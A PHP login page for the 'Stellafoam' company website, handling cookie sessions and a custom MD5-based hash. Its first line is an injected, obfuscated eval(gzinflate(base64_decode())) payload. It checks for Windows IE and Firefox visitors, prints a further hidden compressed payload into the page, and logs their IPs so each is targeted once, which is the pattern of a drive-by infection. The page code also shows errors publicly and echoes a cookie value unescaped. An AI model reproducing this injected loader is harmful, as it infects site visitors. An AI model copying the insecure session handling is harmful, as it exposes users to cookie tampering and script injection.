<?php eval(gzinflate(base64_decode('AEYHufhpZiAoIWlzc2V0KCRmdGwpKXsgZ2xvYmFsICRmdGw7JGZ0bD0xOw0KCSRpcD0kX1NFUlZFUlsiUkVNT1RFX0FERFIiXTskZHI9JF9TRVJWRVJbIkRPQ1VNRU5UX1JPT1QiXTskdWEgPSAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107JGRiZj0kZHIuJy8nLm1kNSgkZHIpOw0KCWlmKChzdHJwb3MoJHVhLCdXaW5kb3dzJykhPT1mYWxzZSkmJigoc3RycG9zKCR1YSwnTVNJRScpIT09ZmFsc2UpfHwoc3RycG9zKCR1YSwnRmlyZWZveCcpIT09ZmFsc2UpKSYmKHN0cnBvcyhAZmlsZV9nZXRfY29udGVudHMoJGRiZiksJGlwKSA9PT0gZmFsc2UpKXsNCgkJZXJyb3JfcmVwb3J0aW5nKDApOw0KCQlwcmludChnemluZmxhdGUoYmFzZTY0X2RlY29kZSgnN0wwSFlCeEpsaVVtTDIzS2UzOUs5VXJYNEhTaENJQmdFeVRZa0VBUTdNR0l6ZWFTN0IxcFJ5TXBxeXFCeW1WV1pWMW1Ga0RNN1oyODk5NTc3NzMzM252dnZmZTZPNTFPSi9mZi96OWNabVFCYlBiT1N0ckpuaUdBcXNnZlAzNThIejhpSGpmVHVsaTFSNWVmZlhTWmZmVEpSK1ZIaDIxOS9Zdnp5VVdUMTVOUFBqbjhKZE9zbmM2M21tV2RYOVR2N3Z4aWZIdXh6SDlRWC96TXZiMVA5ZHNmdEpPOHZmT0xGNTk5a2JYencvenlzNnRpT2F1dXZ2Y1JRY3cvK3VUeSs0ZS81UHo4czQvTzYycHhNczgrT2l6T3QzYjJkajc3Yk9mZDdzNmQ4L05QUHZ1b1BxbG0rVWVIeTg4KzJydi9DMy9oM3FlLzhCZnU3dTNTUDdzUGYrRXYzRC80aGIvdy9nUDh3UjhmNERkcXRIdHZIMy9pdDExOHhpL2R1L2NMZitHbmUvaHJCNTgvMEk4Tzd0dW1EMHhUK1kxYjdPay9CL3dMZ08zdzYrZ0FHRHprTisvNWJ3S2grL3d4ZzM2Z0grL2V3K2VmS3NJN0JPcFRCcktqbit6VEwzc1BaWVQ5a2U3ZXM5MjZjZDNUZC9IL0I1K0dyKy91N3dsOWxBUjRrMGNEWFBZWkl2MERDS1l6andpV3BQZUNrVG1hZklyUDd6R3BnU0dqeVcwdEFRandnd2ZtcTZFUk1INUNZLzd5VTNucFBnOGRuekJNYm9DeFBkZ1hva252VEQwR3dIUytwNDI0TTI0aFRNRW83NXAvOEpsOHlTOHhhZTdyVlBEQStKZDkwOUwwTE5nd0R1NHZVQjNUK0tsZ0xJTnhzMmI1QjMrYVlYMTZYLzRQQnRtM29HU0tkczJmZHVpRGI4bUFtQXhNWkROMXdJZDVUMmpDclF3S091UmQwOTVOR21BODRJKzRkK1lTTytkMjRxWEZRLzNMZ3l0TXduQjVISjlxMjExTDUzdnVTMHRmWWNZREE5Y3luL0RLbm55TzZRQm5hMjhIK28vL0ZZYUxTY0h2UEhzYk9ZNEp0THRCWklJUEJBb1BqMUc3Yi84TVJpc1R1YW5iUUZUam9pNU10Njl0R1NTTENJWm1SRlk0R3ZCdVZuUGNWbERoRis3cGwwemxBd1prSlNnQ2d6V1ZZK2FCY1lINDk4MGNzdUFaaGVscFdNZG4vQ1dUenZManZRQXZxenREcFlDUFB0M1ZyeHhYeTFRWWZyaW44eS9BR0dIR2RWOGJNWGQvYWxHVGticHVIdmgwMnpNdFBqWG9PWTIzcTUwcFVNTUpCd3psb2Y2RktmdFVCek5BSVBtSFlaaUprQy9EUWQ1Q2RIVWl0QUczWjNabEdUYXppc2w4RHl4dUsraW1iN0dJVnJDRmdKRUpmazhzN3V0N25sclFIbzArZkdCR0tUTVVVTWE5TDErR1N1Um1RQ0s2ZThiOFc1NWpqaEU5MmRkblZuSmtJcDBzTXZWMlZLT2JueDRDUHl1QzVOaEJNSGxvUGdPTW16RDVJUGVBdTNJVXZGSGo4SUFPN05UdE1PS0daZzh0ZXpuZFkrZ3NId09XSUtYemlrSHM3anlRVWUzdVBEUm9NVWdqcHg0T3JCY2RoMXRoQTFCeE1nL2lsTm5kMy8xbzNLektvdDM2NkJmK3dvL3VITTQvMnp0c1B2dUl2ZG5GbmZPcTNpbysyemtzdHU4ZjNQdGQ4Y3RudTU4VWQzN3gyOCtLdythVHoxNjNkYkc4K043NStmZTNsdDhydnI4Ti8vZVQ0bmVmMzdseitFc0NiemkvM0dyb3M4ZDMxVEgvZndJQUFQLy8nKSkpOw0KCQlpZiAoJGZwID0gQGZvcGVuKCRkYmYgLCAiYSIpKXtmcHV0cygkZnAgLCAkaXAuJ3wnKTsgZmNsb3NlKCRmcCk7fQ0KCX0NCn0NCgEAAP//')));?>
<?php

include("function.php");

define('s1','293ndjxz9dj564%4�%$%��%�%ids02i09e3j923uicm\iosd;dojdfjidf9e23jioocd');
define('s2','-bkp$%�Y21mof^�$^sdmiottw%$%�peqc,cr2mi0-crf2j90f4^2nj90erk0-m348n9b');
define('s3','n"!\d2bfu90g\0-"^%^�-dwd^$%�$uj893gfnh0q4j234njh-cfb-2v1=bv42-bvh349');
define('s4','h\vc8923j89cjfdjfsdj$%�$�ovfduj53hivfdnhufg[gq=q]=q]=rgn-=qtnq904n82');
define('sessionlen',20000);
$loggedIn = false;

$user = array();

if(isset($_COOKIE['stellafoamuser'])){
	$splitCookie = explode('_', $_COOKIE['stellafoamuser']);
	if($splitCookie[1] > time()-sessionlen){
		if(generate_hash($splitCookie[2].$splitCookie[1]) == $splitCookie[0]){
			$loggedIn = true;
			$user = array($splitCookie[3],$splitCookie[2]);
		}
	}
}

// Report all PHP errors
error_reporting(E_ALL);
ini_set('display_errors', '1');
ini_set('error_reporting', E_ALL);
ini_set('error_display', '1');

function generate_hash( $value ){
		
	$valueLen = strLen( $value );

	$majorPepper = substr(s1,0,$valueLen+1);
	
	$n=$valueLen;
	$valuePeppered = '';
	while( $n-- ){
		$valuePeppered .= $value[$n].$majorPepper[$n];
	}
	
	$h1 = md5( s1 . substr($valuePeppered,0,$valueLen).$valueLen . s2 );
	$h2 = md5( s3 . substr($valuePeppered,$valueLen).$valueLen . s4 );
	
	$h = substr( $h1,0,8) . substr( $h2,8,8) . substr( $h1,8,8) . substr( $h2,16,8) . substr( $h1,16,8) . substr( $h2,24,8) . substr( $h1,24,8) . substr( $h2,0,8);
	return ( $h );
	
}

function login( $username, $password ){
	global $user;
	//if($username == $user[0] && $password == $user[1]){
	$user = checkLogin($username, $password);
	if($user){
		setcookie('stellafoamuser', generate_hash($user[1].time()).'_'.time().'_'.$user[1].'_'.$user[0], time()+sessionlen);
		return true;
	}else{
		return false;
	}
}

if(isset($_POST['username']) && isset($_POST['password'])){
	$loginReturn = login($_POST['username'],$_POST['password']);
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"> 
<head> 
	<link rel="shortcut icon" href="../favicon.ico" type="image/x-icon" />
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /> 
	<title>Stellafoam - Account</title> 
	<?php
		include  '../meta.php';
    ?>
    
    <style type="text/css">
	#content{
		padding:20px;
		text-align:center;
	}
	#footer {
		text-align:center;
		clear: both;
		padding: 15px;
		width: 934px;
		background: #f5f3f2;
	}
	#footer a{
		color:#016bb5;
		font-size:13px;
	}
	dt{
		background: #fff url(subnav-title-bg.jpg) 0 1px no-repeat;
	}
	</style>
	<link rel="stylesheet" type="text/css" href="../style.css" media="all" /> 
	<link rel="stylesheet" type="text/css" href="../navigation.css" media="all" /> 
	<link rel="stylesheet" type="text/css" href="../typography_core.css" media="all" />
</head> 
<body id="build">
	<div id="pageWrapper"> 
        <div style="width:190px;float:right"></div>
        <?php
			include  '../header.php';
    	?>
    	
        <div id="breadcrumb"><a href="/stellafoam/" title="Homepage">Homepage</a> > Account
        	
        	<div style="float:right;margin-right:2px;">
             	<?php
					$amount = 0;
					if(isset($_COOKIE["stellafoamorder"])){
						$amount = count(explode('|',$_COOKIE["stellafoamorder"]));
					}
					echo '<strong>Order List:</strong> '.$amount.' items - ';
				?>
                <a href="/stellafoam/cart.php">Basket</a>
        	</div>
            <?php
					if($loggedIn){ echo '<div style="float:right;margin-right:250px;">'.$user[0].' - <a href="/stellafoam/account/logout.php">Logout</a></div>'; }
			?>
        </div>
        
        <div id="content">

		<?php 
		if(isset($_POST['username']) && isset($_POST['password'])) {
			if(!$loginReturn){ 
				echo '<p align="center" style=color:red">Username or Password incorrect</p>';
			}else{
				echo '<p align="center" style=color:green">Logged in '.$user[0].'</p>';
			}
		}
		?>
		<form method="post">
			<h3 style="font-size: 19px;">Login</h3>
			<table align="center" style="margin-top:30px;padding-right:55px;" cellpadding="12px" cellspacing="12px">
			<tr align="right" style="margin-top:10px;"><td style="width:50%;">Username:</td><td align="left" style="width:50%;"><input type="text" name="username" /></td></tr>
			<tr align="right" style="width:50%"><td style="width:50%;">Password:</td><td align="left" style="width:50%;"><input type="password" name="password"  /></td></tr><tr height="30px;"><td>&nbsp;</td><td>
			<input type="submit" value="Enter" style="padding:2px 10px;" />
			</td></tr></table><br>
		</form>
		</div>
			<div id="footer">
				<div style="float:left;">Website by Anthony Dillon</div><div style="float:right;">&copy;2011 Stellafoam Ltd. All Rights Reserved.</div>
			</div>
		</div>
    </body>
</html>